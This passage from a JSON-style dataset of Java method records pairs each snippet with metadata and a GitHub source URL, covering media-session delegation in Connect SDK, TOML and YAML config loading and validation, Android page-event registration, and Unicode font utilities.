fastForward(ResponseListener<Object> listener) {\n        MediaControl mediaControl = null;\n\n        if (service != null)\n            mediaControl = service.getAPI(MediaControl.class);\n\n        if (mediaControl != null)\n            mediaControl.fastForward(listener);\n        else if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32648, "method_name": "previous", "class_name": "WebAppSession", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void previous(ResponseListener<Object> listener) {\n        MediaControl mediaControl = null;\n\n        if (service != null)\n            mediaControl = service.getAPI(MediaControl.class);\n\n        if (mediaControl != null)\n            mediaControl.previous(listener);\n        else if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32649, "method_name": "next", "class_name": "WebAppSession", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void next(ResponseListener<Object> listener) {\n        MediaControl mediaControl = null;\n\n        if (service != null)\n            mediaControl = service.getAPI(MediaControl.class);\n\n        if (mediaControl != null)\n            mediaControl.next(listener);\n        else if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32650, "method_name": "seek", "class_name": "WebAppSession", "params": ["long", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void seek(long position, ResponseListener<Object> listener) {\n        MediaControl mediaControl = null;\n\n        if (service != null)\n            mediaControl = service.getAPI(MediaControl.class);\n\n        if (mediaControl != null)\n            mediaControl.seek(position, listener);\n        else if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32651, "method_name": "getDuration", "class_name": "WebAppSession", "params": ["DurationListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getDuration(DurationListener listener) {\n        MediaControl mediaControl = null;\n\n        if (service != null)\n            mediaControl = service.getAPI(MediaControl.class);\n\n        if (mediaControl != null)\n            mediaControl.getDuration(listener);\n        else if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32652, "method_name": "getPosition", "class_name": "WebAppSession", "params": ["PositionListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getPosition(PositionListener listener) {\n        MediaControl mediaControl = null;\n\n        if (service != null)\n            mediaControl = service.getAPI(MediaControl.class);\n\n        if (mediaControl != null)\n            mediaControl.getPosition(listener);\n        else if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32653, "method_name": "getPlayState", "class_name": "WebAppSession", "params": ["PlayStateListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getPlayState(PlayStateListener listener) {\n        MediaControl mediaControl = null;\n\n        if (service != null)\n            mediaControl = service.getAPI(MediaControl.class);\n\n        if (mediaControl != null)\n            mediaControl.getPlayState(listener);\n        else if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32654, "method_name": "subscribePlayState", "class_name": "WebAppSession", "params": ["PlayStateListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<PlayStateListener>", "snippet": "    public ServiceSubscription<PlayStateListener> subscribePlayState(\n            PlayStateListener listener) {\n        MediaControl mediaControl = null;\n\n        if (service != null)\n            mediaControl = service.getAPI(MediaControl.class);\n\n        if (mediaControl != null)\n            return mediaControl.subscribePlayState(listener);\n        else if (listener != null)\n            listener.onError(ServiceCommandError.notSupported());\n\n        return null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32655, "method_name": "closeMedia", "class_name": "WebAppSession", "params": ["LaunchSession", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void closeMedia(LaunchSession launchSession,\n            ResponseListener<Object> listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32656, "method_name": "displayImage", "class_name": "WebAppSession", "params": ["String", "String", "String", "String", "String", "MediaPlayer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void displayImage(String url, String mimeType, String title,\n            String description, String iconSrc,\n            MediaPlayer.LaunchListener listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32657, "method_name": "displayImage", "class_name": "WebAppSession", "params": ["MediaInfo", "MediaPlayer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void displayImage(MediaInfo mediaInfo, MediaPlayer.LaunchListener listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32658, "method_name": "playMedia", "class_name": "WebAppSession", "params": ["String", "String", "String", "String", "String", "boolean", "MediaPlayer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void playMedia(String url, String mimeType, String title, String description, String iconSrc, boolean shouldLoop, MediaPlayer.LaunchListener listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32659, "method_name": "playMedia", "class_name": "WebAppSession", "params": ["MediaInfo", "boolean", "MediaPlayer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void playMedia(MediaInfo mediaInfo, boolean shouldLoop,\n            MediaPlayer.LaunchListener listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32660, "method_name": "getMediaPlayer", "class_name": "WebAppSession", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MediaPlayer", "snippet": "    public MediaPlayer getMediaPlayer() {\n        return null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32661, "method_name": "getMediaPlayerCapabilityLevel", "class_name": "WebAppSession", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getMediaPlayerCapabilityLevel() {\n        return CapabilityPriorityLevel.VERY_LOW;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32662, "method_name": "getPlaylistControl", "class_name": "WebAppSession", "params": [], "throws": null, "modifiers": ["public"], "return_type": "PlaylistControl", "snippet": "    public PlaylistControl getPlaylistControl() {\n        return null;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32663, "method_name": "getPlaylistControlCapabilityLevel", "class_name": "WebAppSession", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getPlaylistControlCapabilityLevel() {\n        return CapabilityPriorityLevel.VERY_LOW;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32664, "method_name": "jumpToTrack", "class_name": "WebAppSession", "params": ["long", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void jumpToTrack(long index, ResponseListener<Object> listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32665, "method_name": "setPlayMode", "class_name": "WebAppSession", "params": ["PlayMode", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPlayMode(PlayMode playMode, ResponseListener<Object> listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32666, "method_name": "getWebAppSessionListener", "class_name": "WebAppSession", "params": [], "throws": null, "modifiers": ["public"], "return_type": "WebAppSessionListener", "snippet": "    public WebAppSessionListener getWebAppSessionListener() {\n        return webAppListener;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32667, "method_name": "setWebAppSessionListener", "class_name": "WebAppSession", "params": ["WebAppSessionListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setWebAppSessionListener(WebAppSessionListener listener) {\n        webAppListener = listener;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/sessions/WebAppSession.java", "stars": "4", "class_props": {"extends": null, "implements": ["MediaControl", "MediaPlayer", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 32668, "method_name": "loadTomlFile", "class_name": "TomlUtil", "params": ["String", "Class<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "T", "snippet": "    public static <T> T loadTomlFile(String path, Class<T> t) {\n        var toml = new Toml();\n        var root = PathUtil.convertCorrectPath(path);\n        toml.read(FileUtil.file(root));\n        return toml.to(t);\n    }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/util/TomlUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32669, "method_name": "tomlToObj", "class_name": "TomlUtil", "params": ["String", "Class<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "T", "snippet": "    public static <T> T tomlToObj(String tomlString, Class<T> tClass) {\n        var toml = new Toml();\n        toml.read(tomlString);\n        return toml.to(tClass);\n    }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/util/TomlUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32670, "method_name": "main", "class_name": "TomlUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        var path = System.getProperty(\"user.dir\") + \"/site-demo/themes/default/static\";\n        path = PathUtil.convertCorrectPath(path);\n        var files = FileUtil.loopFiles(path);\n        for (File file : files) {\n            System.out.println(file.getPath());\n            System.out.println(FileTypeUtil.getType(file));\n            System.out.println(FileUtil.getMimeType(file.getPath()));\n        }\n    }", "url": "https://raw.githubusercontent.com/Heemooo/Bored/master/src/main/java/com/bored/util/TomlUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 32671, "method_name": "onCreate", "class_name": "EventAppCompatActivity", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(@Nullable Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        // \u666e\u901a\u4e8b\u4ef6\u76d1\u542c\u521d\u59cb\u5316\n        mPageEventEnable = initPageEvent();\n        if (mPageEventEnable && mEventList != null) {\n            for (Class<? extends PageEvent> eventPage : mEventList) {\n                EventHelper.registerEventPage(this, eventPage);\n            }\n        }\n        // \u7c98\u6027\u4e8b\u4ef6\u76d1\u542c\u521d\u59cb\u5316\n        mPageStickEventEnable = initPageStickEvent();\n        if (mPageStickEventEnable && mStickEventList != null) {\n            for (Class<? extends PageEvent> eventPage : mStickEventList) {\n                EventHelper.registerStickEventPage(this, eventPage);\n            }\n        }\n        LogHelper.i(TAG, \"activity: \" + this +\n                \", mPageEventEnable: \" + mPageEventEnable +\n                \", mPageStickEventEnable: \" + mPageStickEventEnable);\n    }", "url": "https://raw.githubusercontent.com/wkp111/PageEventDemo/master/pageevent/src/main/java/com/wkp/pageevent/base/EventAppCompatActivity.java", "stars": "1", "class_props": {"extends": "AppCompatActivity", "implements": ["PageEventListener", "PageStickEventListener", "PageEvent"], "modifiers": ["public"]}}, {"id": 32672, "method_name": "onDestroy", "class_name": "EventAppCompatActivity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDestroy() {\n        // \u666e\u901a\u4e8b\u4ef6\u76d1\u542c\u6ce8\u9500\n        if (mPageEventEnable && mEventList != null) {\n            for (Class<? extends PageEvent> eventPage : mEventList) {\n                EventHelper.unregisterEventPage(this, eventPage);\n            }\n            mEventList.clear();\n            mEventList = null;\n        }\n        // \u7c98\u6027\u4e8b\u4ef6\u76d1\u542c\u6ce8\u9500\n        if (mPageStickEventEnable && mStickEventList != null) {\n            for (Class<? extends PageEvent> eventPage : mStickEventList) {\n                EventHelper.unregisterStickEventPage(this, eventPage);\n            }\n            mStickEventList.clear();\n            mStickEventList = null;\n        }\n        super.onDestroy();\n    }", "url": "https://raw.githubusercontent.com/wkp111/PageEventDemo/master/pageevent/src/main/java/com/wkp/pageevent/base/EventAppCompatActivity.java", "stars": "1", "class_props": {"extends": "AppCompatActivity", "implements": ["PageEventListener", "PageStickEventListener", "PageEvent"], "modifiers": ["public"]}}, {"id": 32673, "method_name": "initPageEvent", "class_name": "EventAppCompatActivity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean initPageEvent() {\n        return false;\n    }", "url": "https://raw.githubusercontent.com/wkp111/PageEventDemo/master/pageevent/src/main/java/com/wkp/pageevent/base/EventAppCompatActivity.java", "stars": "1", "class_props": {"extends": "AppCompatActivity", "implements": ["PageEventListener", "PageStickEventListener", "PageEvent"], "modifiers": ["public"]}}, {"id": 32674, "method_name": "addPageEvent", "class_name": "EventAppCompatActivity", "params": ["Class<PageEvent>"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void addPageEvent(Class<? extends PageEvent> eventPage) {\n        if (eventPage == null) {\n            return;\n        }\n        if (mEventList == null) {\n            mEventList = new ArrayList<>();\n        }\n        if (mEventList.contains(eventPage)) {\n            return;\n        }\n        mEventList.add(eventPage);\n    }", "url": "https://raw.githubusercontent.com/wkp111/PageEventDemo/master/pageevent/src/main/java/com/wkp/pageevent/base/EventAppCompatActivity.java", "stars": "1", "class_props": {"extends": "AppCompatActivity", "implements": ["PageEventListener", "PageStickEventListener", "PageEvent"], "modifiers": ["public"]}}, {"id": 32675, "method_name": "onEvent", "class_name": "EventAppCompatActivity", "params": ["Event"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onEvent(@NonNull Event event) {\n    }", "url": "https://raw.githubusercontent.com/wkp111/PageEventDemo/master/pageevent/src/main/java/com/wkp/pageevent/base/EventAppCompatActivity.java", "stars": "1", "class_props": {"extends": "AppCompatActivity", "implements": ["PageEventListener", "PageStickEventListener", "PageEvent"], "modifiers": ["public"]}}, {"id": 32676, "method_name": "initPageStickEvent", "class_name": "EventAppCompatActivity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean initPageStickEvent() {\n        return false;\n    }", "url": "https://raw.githubusercontent.com/wkp111/PageEventDemo/master/pageevent/src/main/java/com/wkp/pageevent/base/EventAppCompatActivity.java", "stars": "1", "class_props": {"extends": "AppCompatActivity", "implements": ["PageEventListener", "PageStickEventListener", "PageEvent"], "modifiers": ["public"]}}, {"id": 32677, "method_name": "addPageStickEvent", "class_name": "EventAppCompatActivity", "params": ["Class<PageEvent>"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void addPageStickEvent(Class<? extends PageEvent> eventPage) {\n        if (eventPage == null) {\n            return;\n        }\n        if (mStickEventList == null) {\n            mStickEventList = new ArrayList<>();\n        }\n        if (mStickEventList.contains(eventPage)) {\n            return;\n        }\n        mStickEventList.add(eventPage);\n    }", "url": "https://raw.githubusercontent.com/wkp111/PageEventDemo/master/pageevent/src/main/java/com/wkp/pageevent/base/EventAppCompatActivity.java", "stars": "1", "class_props": {"extends": "AppCompatActivity", "implements": ["PageEventListener", "PageStickEventListener", "PageEvent"], "modifiers": ["public"]}}, {"id": 32678, "method_name": "onStickEvent", "class_name": "EventAppCompatActivity", "params": ["Event"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onStickEvent(@NonNull Event event) {\n        return false;\n    }", "url": "https://raw.githubusercontent.com/wkp111/PageEventDemo/master/pageevent/src/main/java/com/wkp/pageevent/base/EventAppCompatActivity.java", "stars": "1", "class_props": {"extends": "AppCompatActivity", "implements": ["PageEventListener", "PageStickEventListener", "PageEvent"], "modifiers": ["public"]}}, {"id": 32679, "method_name": "parseConfigFile", "class_name": "InitConfigService", "params": ["String"], "throws": ["FileNotFoundException"], "modifiers": ["public"], "return_type": "InitConfigEntity", "snippet": "    public InitConfigEntity parseConfigFile(String filePath) throws FileNotFoundException {\n        File file = new File(filePath);\n        if (!file.exists() && !file.isFile()) {\n            throw new FileNotFoundException(filePath);\n        }\n        InitConfigEntity initConfigEntity = null;\n        Yaml yaml = new Yaml();\n        try {\n            initConfigEntity = yaml.loadAs(new FileInputStream(file), InitConfigEntity.class);\n        } catch (Exception e) {\n            // log.error(\"\u914d\u7f6e\u6587\u4ef6\u8bfb\u53d6\u5f02\u5e38\uff0c\u8bf7\u68c0\u67e5\u5404\u914d\u7f6e\u9879\u662f\u5426\u7b26\u5408\u683c\u5f0f\u8981\u6c42\");\n            log.error(\"An exception occurred while reading the configuration , please check whether each configuration item meets the format requirements\");\n        }\n        return initConfigEntity;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/InitConfigService.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32680, "method_name": "isCorrectConfig", "class_name": "InitConfigService", "params": ["InitConfigEntity"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isCorrectConfig(InitConfigEntity initConfigEntity) {\n        boolean isCorrect = true;\n\n        if (!isNotEmptyConfig(initConfigEntity)) {\n            // log.error(\"\u914d\u7f6e\u6587\u4ef6\u4e2d\u76f8\u5173\u914d\u7f6e\u9879\u4e3a\u7a7a\");\n            log.error(\"The value in the configuration  cannot be null\");\n            isCorrect = false;\n        }\n\n        if (!isCorrectFormat(initConfigEntity)) {\n            // log.error(\"\u914d\u7f6e\u6587\u4ef6\u4e2d\u76f8\u5173\u57df\u540d\u7684ip\u548c\u7aef\u53e3\u683c\u5f0f\u4e0d\u6b63\u786e\");\n            log.error(\"The ip\uff0c port and domain names is not valid\");\n            isCorrect = false;\n        }\n        if (!isCorrectDomain(initConfigEntity)) {\n            // log.error(\"\u914d\u7f6e\u6587\u4ef6\u4e2dorderer\u6216peer\u7684\u57df\u540d\u4e0d\u5339\u914d\");\n            log.error(\"The orderer or peer domain names is not matched\");\n            isCorrect = false;\n        }\n        if (!checkPeerConfig(initConfigEntity)) {\n            // log.error(\"\u914d\u7f6e\u6587\u4ef6\u4e2dpeer\u6ca1\u6709\u914d\u7f6e\u76f8\u5e94\u7684\u4ea4\u6613\u67e5\u8be2\u7aef\u53e3\");\n            log.error(\"No transaction query port about peer in the configuration \");\n            isCorrect = false;\n        }\n\n        return isCorrect;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/InitConfigService.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32681, "method_name": "isCorrectDomain", "class_name": "InitConfigService", "params": ["InitConfigEntity"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isCorrectDomain(InitConfigEntity initConfigEntity) {\n        String ordererDomain = initConfigEntity.getOrdererDomain();\n        String peerDomain = initConfigEntity.getPeerDomain();\n        boolean peerMatch = initConfigEntity.getPeerHostConfig().keySet().stream().allMatch(i -> i.endsWith(peerDomain));\n        boolean ordererMatch = initConfigEntity.getOrdererHostConfig().keySet().stream().allMatch(i -> i.endsWith(ordererDomain));\n        return peerMatch && ordererMatch;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/InitConfigService.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32682, "method_name": "checkPeerConfig", "class_name": "InitConfigService", "params": ["InitConfigEntity"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean checkPeerConfig(InitConfigEntity configEntity) {\n        boolean isCorrect = true;\n        Map<String, String> peerConfigMap = configEntity.getPeerHostConfig();\n        Map<String, String> peerMetricConfigMap = configEntity.getMetricPortConfig();\n        for (String host : peerConfigMap.keySet()) {\n            if (peerMetricConfigMap.keySet().stream().noneMatch(i -> i.equals(host))) {\n                isCorrect = false;\n            }\n        }\n        return isCorrect;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/InitConfigService.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32683, "method_name": "isNotEmptyConfig", "class_name": "InitConfigService", "params": ["InitConfigEntity"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isNotEmptyConfig(InitConfigEntity configEntity) {\n        boolean isCorrect = true;\n        if (StringUtils.isEmpty(configEntity.getNetwork())\n                || StringUtils.isEmpty(configEntity.getChannelName())\n                || StringUtils.isEmpty(configEntity.getOrgMSPID())\n                || StringUtils.isEmpty(configEntity.getOrgName())\n                || StringUtils.isEmpty(configEntity.getOrdererDomain())\n                || StringUtils.isEmpty(configEntity.getPeerDomain())) {\n            isCorrect = false;\n        }\n        if (CollectionUtils.isEmpty(configEntity.getOrdererHostConfig())\n                || CollectionUtils.isEmpty(configEntity.getPeerHostConfig())\n                || CollectionUtils.isEmpty(configEntity.getMetricPortConfig())) {\n            isCorrect = false;\n        }\n\n        if (configEntity.getOrdererHostConfig().entrySet().stream().anyMatch(i -> StringUtils.isEmpty(i.getValue()))) {\n            isCorrect = false;\n        }\n\n        if (configEntity.getPeerHostConfig().entrySet().stream().anyMatch(i -> StringUtils.isEmpty(i.getValue()))) {\n            isCorrect = false;\n        }\n\n        if (configEntity.getMetricPortConfig().entrySet().stream().anyMatch(i -> StringUtils.isEmpty(i.getValue()))) {\n            isCorrect = false;\n        }\n\n        return isCorrect;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/InitConfigService.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32684, "method_name": "isCorrectFormat", "class_name": "InitConfigService", "params": ["InitConfigEntity"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isCorrectFormat(InitConfigEntity configEntity) {\n        Collection<String> peerIpPorts = configEntity.getPeerHostConfig().values();\n        if (!isCorrectFormat(peerIpPorts)) {\n            return false;\n        }\n        Collection<String> ordererIpPorts = configEntity.getOrdererHostConfig().values();\n        return isCorrectFormat(ordererIpPorts);\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/InitConfigService.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32685, "method_name": "isCorrectFormat", "class_name": "InitConfigService", "params": ["Collection<String>"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isCorrectFormat(Collection<String> ipPorts) {\n        for (String ipPort : ipPorts) {\n            if (ipPort.split(\":\").length != 2) {\n                return false;\n            }\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/InitConfigService.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32686, "method_name": "main", "class_name": "Demo04GenericInterface", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u521b\u5efaGenericInterfaceImpl1\u5bf9\u8c61\n        GenericInterfaceImpl1 gi1 = new GenericInterfaceImpl1();\n        gi1.method(\"\u5b57\u7b26\u4e32\");\n\n        //\u521b\u5efaGenericInterfaceImpl2\u5bf9\u8c61\n        GenericInterfaceImpl2<Integer> gi2 = new GenericInterfaceImpl2<>();\n        gi2.method(10);\n\n        GenericInterfaceImpl2<Double> gi3 = new GenericInterfaceImpl2<>();\n        gi3.method(8.8);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/13.%E3%80%90Collection%E3%80%81%E6%B3%9B%E5%9E%8B%E3%80%91-%E7%AC%94%E8%AE%B0/code/02_CollectionAndReflect/src/com/itheima/demo03/Generic/Demo04GenericInterface.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32687, "method_name": "chinaToUnicode", "class_name": "FontUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String chinaToUnicode(String str) {\n        String result = \"\";\n        for (int i = 0; i < str.length(); i++) {\n            int chr1 = str.charAt(i);\n            if (chr1 >= 19968 && chr1 <= 171941) {\n                result += \"\\\\u\" + Integer.toHexString(chr1);\n            } else {\n                result += str.charAt(i);\n            }\n        }\n        return result;\n    }", "url": "https://raw.githubusercontent.com/buhuaqi/baidu-index/master/src/main/java/com/baidu/index/utils/FontUtil.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32688, "method_name": "isChinese", "class_name": "FontUtil", "params": ["char"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isChinese(char c) {\n        Character.UnicodeBlock ub = Character.UnicodeBlock.of(c);\n        if (ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS\n                || ub == 